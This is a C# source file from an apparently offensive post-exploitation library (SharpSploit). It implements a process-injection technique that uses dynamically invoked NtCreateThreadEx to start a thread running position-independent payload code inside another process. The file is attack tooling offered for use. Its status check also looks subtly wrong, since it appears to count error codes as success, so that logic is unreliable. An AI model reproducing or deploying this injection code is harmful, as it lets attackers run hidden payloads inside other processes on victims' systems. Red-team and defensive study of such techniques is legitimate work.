using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace SharpSploit.Execution.Injection
{
    /// <summary>
    /// Base class for injection techniques (variants).
    /// </summary>
    public abstract class VariantType
    {
        //An array containing a set of PayloadType objects that are supported.
        protected Type[] supportedPayloads;

        /// <summary>
        /// Informs objects using this technique whether or not it supports the type of a particular payload.
        /// </summary>
        /// <param name="payload">A payload.</param>
        /// <returns>Whether or not the payload is of a supported type for this strategy.</returns>
        public bool IsSupportedPayloadType(PayloadType payload)
        {
            return supportedPayloads.Contains(payload.GetType());
        }

        /// <summary>
        /// Internal method for setting the supported payload types. Used in constructors.
        /// </summary>
        abstract internal void defineSupportedPayloadTypes();

        /// <summary>
        /// Top-level method for injecting payloads using this technique.
        /// This wrapper function should invoke the Inject method for the appropriate payload type and 
        ///     return a PayloadTypeNotSupported exception if the payload passed in is not supported.
        /// </summary>
        /// <param name="payload"></param>
        /// <param name="baseAddr"></param>
        /// <param name="process"></param>
        /// <returns></returns>
        abstract public bool Inject(PayloadType payload, IntPtr baseAddr, System.Diagnostics.Process process);
    }

    //TODO: Add a RemoteThreadVariantBase class that provides options for all RemoteThread variants. 

    /// <summary>
    /// RemoteThread variant that simply creates a thread in a remote process at a specified address using NtCreateThreadEx.
    /// </summary>
    public class RemoteThreadCreateVariant : VariantType
    {
        //Option: Whether to start the thread in a suspended state.
        //Default value: False.
        private RemoteThreadCreateOptions options = new RemoteThreadCreateOptions(false);

        //Handle of the new thread. Only valid after the thread has been created.
        private IntPtr handle = IntPtr.Zero;

        /// <summary>
        /// Default constructor.
        /// </summary>
        public RemoteThreadCreateVariant()
        {
            defineSupportedPayloadTypes();

        }

        /// <summary>
        /// Constructor with options passed in.
        /// </summary>
        /// <param name="options">The options to set.</param>
        public RemoteThreadCreateVariant(RemoteThreadCreateOptions optionsIn)
        {
            defineSupportedPayloadTypes();

            setOptions(optionsIn);
        }

        /// <summary>
        /// Set the options for the variant. 
        /// </summary>
        /// <param name="optionsIn">New set of options.</param>
        public void setOptions(RemoteThreadCreateOptions optionsIn)
        {
            options = optionsIn;
        }

        /// <summary>
        /// Internal method for setting the supported payload types. Used in constructors.
        /// </summary>
        internal override void defineSupportedPayloadTypes()
        {
            //Defines the set of supported payload types.
            supportedPayloads = new Type[] {
                typeof(PICPayload)
            };
        }

        /// <summary>
        /// Create a thread in the remote process using NtCreateThreadEx.
        /// </summary>
        /// <param name="payload"></param>
        /// <param name="baseAddr"></param>
        /// <param name="process"></param>
        /// <returns></returns>
        public override bool Inject(PayloadType payload, IntPtr baseAddr, System.Diagnostics.Process process)
        {
            if (IsSupportedPayloadType(payload))
            {
                IntPtr threadHandle = new IntPtr();

                //Dynamically invoke NtCreateThreadEx to create a thread at the address specified in the target process.
                Win32.NtDll.NTSTATUS result = DynamicInvoke.Native.NtCreateThreadEx(ref threadHandle, Win32.WinNT.ACCESS_MASK.SPECIFIC_RIGHTS_ALL | Win32.WinNT.ACCESS_MASK.STANDARD_RIGHTS_ALL, IntPtr.Zero,
                    process.Handle, baseAddr, IntPtr.Zero, options.suspended, 0, 0, 0, IntPtr.Zero);

                //If successful, return the handle to the new thread. Otherwise return NULL
                if (result > Win32.NtDll.NTSTATUS.Success)
                {
                    handle = threadHandle;
                    return true;
                }
                else
                    return false;
            }
            else
                throw new PayloadTypeNotSupported(payload.GetType());
        }

        /// <summary>
        /// Get the handle of the created thread. Will return IntPtr.Zero if the payload has not been injected yet.
        /// </summary>
        /// <returns></returns>
        public IntPtr getHandle()
        {
            return handle;
        }
    }

    /// <summary>
    /// Struct containing a set of options for the RemoteThreadCreateVariant class.
    /// </summary>
    public struct RemoteThreadCreateOptions
    {
        //Whether or not to create the thread in a suspended state.
        public bool suspended;

        /// <summary>
        /// Constructor for options struct.
        /// </summary>
        /// <param name="suspendOption">Whether or not to create the thread in a suspended state.</param>
        public RemoteThreadCreateOptions(bool suspendOption)
        {
            suspended = suspendOption;
        }
    }
}
